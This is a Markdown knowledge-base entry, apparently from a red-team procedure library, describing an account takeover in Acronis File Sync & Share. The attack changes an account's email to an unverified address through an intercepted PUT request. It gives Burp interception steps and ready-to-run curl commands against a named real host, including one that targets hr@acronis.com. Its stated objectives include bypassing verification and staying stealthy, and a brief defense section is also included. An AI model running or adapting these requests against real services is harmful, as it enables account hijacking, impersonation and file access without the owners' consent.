---
id: intercept-modify-email-request
tags:
  - api-abuse
  - request-modification
  - account-takeover
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
commands:
  - '[[commands/modify-account-email-put]]'
  - '[[commands/target-unverified-email-json]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Manipulation]]'
updated_at: '2025-12-14T17:33:12.066Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
mitre_techniques:
  - '[[Account Manipulation]]'
---
# Intercept-and-Modify-Email-Change-Request

## Summary

This core exploitation procedure intercepts the HTTP PUT request triggered by the profile save action in Acronis File Sync & Share and modifies the email parameter to an unverified target address, enabling account takeover without authentication checks.

## Description

The vulnerability stems from the /fc/api/v1/account endpoint accepting email changes without verification, only blocking already-verified (taken) emails. Using a proxy like Burp Suite, the attacker alters the JSON payload during the name change process. This isolates changes to File Sync & Share, avoiding detection in main profiles. Prerequisites include an active session and proxy setup. Successful execution results in the attacker's control over the targeted unverified account for impersonation and file access.

## Requirements

1. Active session with profile modal open
2. Burp Suite or similar proxy intercepting browser traffic
3. Target unverified email address (e.g., hr@acronis.com)
4. Knowledge of JSON payload structure

## Defense

Defensive measures and detection strategies:

- Enforce email verification or OTP for all account modifications via API
- Implement request signing or CSRF tokens to prevent tampering
- Monitor API logs for PUT requests to account endpoints with email changes from non-standard sources
- Use WAF rules to detect proxy-intercepted requests or anomalous payloads

## Objectives

1. Modify email to unverified target for takeover
2. Bypass verification checks in the API
3. Maintain stealth by avoiding profile visibility

## Instructions

### Step 1: Trigger and Intercept Request

**Context**: Initiate the save action in the modal to capture the vulnerable PUT request.

Configure [[tools/Burp-Suite]] as a proxy for the browser, then enter a name change in the modal and click save to trigger the request.

> The request to PUT /fc/api/v1/account is intercepted in Burp's Proxy tab. Inspect the JSON body containing name and email.

### Step 2: Modify Payload

**Context**: Alter the email field to target an unverified address while keeping the session valid.

**Command** ([[commands/modify-account-email-put]]):

Use Burp to edit the request body, or simulate with curl:

```bash
curl -X PUT https://mc-beta-cloud.acronis.com/fc/api/v1/account \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <session-token>" \
  -d '{"name":"Staff Member","email":"0xcrypto+staffmember1@wearehackerone.com"}'
```

> Replace <session-token> with the actual Bearer token from the intercepted request. This updates the account with the new email if unverified.

### Step 3: Forward and Confirm

**Context**: Send the modified request and check response.

**Command** ([[commands/target-unverified-email-json]]):

For a specific target:

```bash
curl -X PUT https://mc-beta-cloud.acronis.com/fc/api/v1/account \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <session-token>" \
  -d '{"name":"Human Resource","email":"hr@acronis.com"}'
```

> Expected 204 No Content for success; error if email is verified/taken. Forward in Burp to complete.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Persistence]] Persistence

### Techniques

- [[Account Manipulation]] Account Manipulation

### Sub-Techniques


## Commands Used

- [[commands/modify-account-email-put]]
- [[commands/target-unverified-email-json]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- api-modification
- http-intercept
- email-takeover
